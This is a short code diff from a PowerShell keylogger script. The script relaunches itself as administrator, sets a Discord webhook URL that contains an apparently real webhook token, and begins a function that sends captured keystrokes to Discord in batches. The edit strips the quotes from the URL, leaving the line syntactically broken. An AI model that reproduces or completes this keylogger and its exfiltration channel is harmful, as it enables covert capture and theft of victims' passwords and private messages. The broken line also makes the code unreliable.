@@ -17,8 +17,7 @@ function Restart-AsAdmin {
 Restart-AsAdmin
 
 # Discord Webhook URL
-$webhookUrl = "https://discord.com/api/webhooks/1344607221740343337/lwdCUq4o12NlLCdVRyjodVoZLeUpvA_liHKdoo8tz0LvrfEekbLFnTDKbZEyScNzT_Zv"
-
+$webhookUrl = https://discord.com/api/webhooks/1344607221740343337/lwdCUq4o12NlLCdVRyjodVoZLeUpvA_liHKdoo8tz0LvrfEekbLFnTDKbZEyScNzT_Zv
 # Function to send keylogs to Discord in batches
 function Send-LogToDiscord {
     param([string]$message)
